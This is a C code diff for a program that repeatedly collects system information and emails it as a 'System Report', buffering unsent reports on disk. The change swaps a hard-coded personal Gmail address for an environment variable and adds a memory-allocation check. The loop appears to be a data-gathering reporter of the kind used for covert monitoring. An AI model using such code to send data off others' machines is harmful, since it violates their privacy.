@@ -45,6 +45,11 @@ void send_buffered_reports(const char *recipient) {
         rewind(fp);
 
         char *buf = malloc(len + 1);
+        if (!buf) {
+            fclose(fp);
+            continue;
+        }
+
         fread(buf, 1, len, fp);
         buf[len] = '\0';
         fclose(fp);
@@ -61,8 +66,13 @@ void send_buffered_reports(const char *recipient) {
 }
 
 void start_listener(void) {
-    const char *recipient = "akshaypiranavb@gmail.com";
-    int mail_sent = 0;   
+    const char *recipient = getenv("EMAIL_RECEIVER");
+    if (!recipient || strlen(recipient) == 0) {
+        fprintf(stderr, "[-] EMAIL_RECEIVER not set in environment.\n");
+        return;
+    }
+
+    int mail_sent = 0;
     while (1) {
         char *report = collect_sys_info();
         if (!report) {
@@ -76,8 +86,8 @@ void start_listener(void) {
             send_buffered_reports(recipient);
 
             if (send_mail(recipient, "System Report", report) == 0) {
-                printf("[+] Email sent successfully! \n");
-                mail_sent = 1; 
+                printf("[+] Email sent successfully!\n");
+                mail_sent = 1;
             } else {
                 printf("[-] Failed to send current report, saving offline.\n");
                 save_report_to_file(report);
